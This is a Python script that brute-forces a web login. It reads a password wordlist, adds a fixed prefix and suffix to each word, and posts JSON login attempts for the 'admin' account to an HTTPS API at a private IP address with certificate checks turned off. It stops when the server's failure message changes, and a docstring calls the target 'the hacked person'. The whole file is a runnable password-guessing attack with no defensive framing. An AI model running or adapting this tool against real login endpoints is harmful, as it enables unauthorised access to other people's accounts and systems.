import requests
import json
from time import sleep


def load_psw_list(file_path):
    out = []
    with open(file_path) as fp:
        line = fp.readline()
        cnt = 1
        while line:
            print("Line {}: {}".format(cnt, line.strip()))
            out.append(line[:-1])
            line = fp.readline()
            cnt += 1
        print('Loaded {} lines')
        return out


def build_psw(word):

    psw = 'A{}84'.format(word)
    return psw


def build_data(username, psw):
    """
    :param username: the username of the hacked person
    :param psw: password
    :return: a json to post to the url login
    """

    data = {
        'method': 'login',
        'params': {
            'name': username,
            'password': psw
        }
    }

    return json.dumps(data)


def psw_submit(url, data):
    response = requests.post(url, data=data, verify=False)
    return response


def validate_try(response, msg_failure):
    body = response.content
    data = json.loads(body.decode('utf-8'))
    msg = data.get('msg')

    if msg != msg_failure:
        return True
    else:
        return False


def psw_cracker():
    url = 'https://10.32.10.110:8043/api/user/login?ajax'
    username = 'admin'
    fp = 'psw_list.txt'
    word_list = load_psw_list(fp)
    msg_failure = 'Sign in authentication failed.'

    for word in word_list:
        psw = build_psw(word)
        data = build_data(username, psw)
        response = psw_submit(url, data)

        if validate_try(response, msg_failure):
            print('SUCCESS! With word: {}'.format(word))
            break
        else:
            print('Failure with word: "{}"'.format(word))
        sleep(0.5)


if __name__ == '__main__':
    psw_cracker()
